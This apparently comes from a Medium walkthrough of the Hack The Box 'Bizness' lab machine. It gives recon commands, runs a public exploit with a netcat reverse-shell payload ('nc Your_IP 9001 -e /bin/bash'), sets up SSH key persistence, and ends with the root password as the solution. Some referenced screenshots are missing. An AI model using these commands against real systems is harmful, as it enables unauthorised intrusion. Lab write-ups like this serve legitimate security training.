# :game_die: Htb Bizness Walkthrough 8511C455Fa30

---

Hello hackers, Today I want to share a write-up about how to solve the Bizness box.

Let’s get started.

## Recon:

```
nmap -sV -sC 10.10.11.252
```

Okay, now we have a website running on port 80,443

We need now to add a domain in this path /etc/hosts by this command.

```
echo "10.10.11.252 bizness.htb" | sudo tee -a /etc/hosts
```

Now we need to visit the website

When searching on the website I found something interesting.

Okay, deep dig into the website, I’ll use ‘dirsearch’.

```
dirsearch -u "https://bizness.htb/"
```

Now, we need to visit this EndPoint /control/login to access the login page.

Let’s type default credentials like admin, admin root, and root but nothing.

## Get Sam’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Okay, I will search for this version and maybe find a public exploit.

## Exploitation:

```
python3 exploit.py --url "https://bizness.htb/" --cmd "nc Your_IP 9001 -e /bin/bash" # To send malicious payload.
nc -nvlp 9001 # to run listener on you machine
```

We need the new connection stable so I will use SSH to do that.

```
ssh-keygen # Generating public/private keys.
python3 -m http.server 8000 # Run simple server on your machine.
```

Run a simple server on your machine and upload the public key on the target.

```
ssh -i id_rsa ofbiz@bizness.htb # Use private key to access machine
```

## Privilege Escalation:

After a long search, I don't find anything interesting, So I try to search in website files and maybe find interesting in the source code.

Here, I found an interesting file.

And this

After cracking this you can access password root ==> {monkeybizness}.

Thanks for reading.

---
